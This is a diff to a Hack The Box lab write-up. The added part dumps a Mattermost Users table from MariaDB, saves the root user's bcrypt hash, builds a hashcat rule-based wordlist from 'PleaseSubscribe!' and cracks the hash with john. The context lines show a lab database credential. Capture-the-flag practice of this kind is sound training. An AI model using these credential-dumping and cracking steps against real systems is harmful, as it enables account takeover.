@@ -150,4 +150,43 @@ mmuser:Crack_The_MM_Admin_PW
 ```
 
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/522fe846-6930-4645-bd83-cf4c9df80cf8)
+```CSS
+show databases;                                                                                                                                          +--------------------+    
+| Database           |                                                                                                                                                     
++--------------------+  
+| information_schema |
+| mattermost         |                                                                                                                                                     
++--------------------+
+2 rows in set (0.001 sec)                                                                                                                                                  
+                                                                                                                                                                           MariaDB [(none)]> use mattermost;                                                                                                                                          Reading table information for completion of table and column names                                                                                                         You can turn off this feature to get a quicker startup with -A                                                                                                             
+                                                                                                                                                                           
+Database changed                                                                                                                                                           MariaDB [mattermost]> show tables;
++------------------------+
+| Tables_in_mattermost   |
++------------------------+
+| Audits                 |
+| Bots                   |
+| ChannelMemberHistory   |
+| ChannelMembers         |
+| ----SNIP----           |
+| UserTermsOfService     |
+| Users                  |
++------------------------+
+MariaDB [mattermost]> select * from Users;                                            
+```
 
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/17873cd0-020e-4c2d-a9a4-06771efa337c)
+
+```
+▶ echo "root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO" >> root.hash
+```
+
+Generate a wordlist based on word "PleaseSubscribe!" using hashcat to crack the password hash of the root user.
+```CSS
+echo PleaseSubscribe! | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout | tee password.lst
+```
+```CSS
+▶ john root.hash --wordlist=password.lst
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/205130d9-bb01-4d2b-b792-05aafcc2ba40)
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/7702b958-100b-47f2-8f76-ac13947d3c8e)
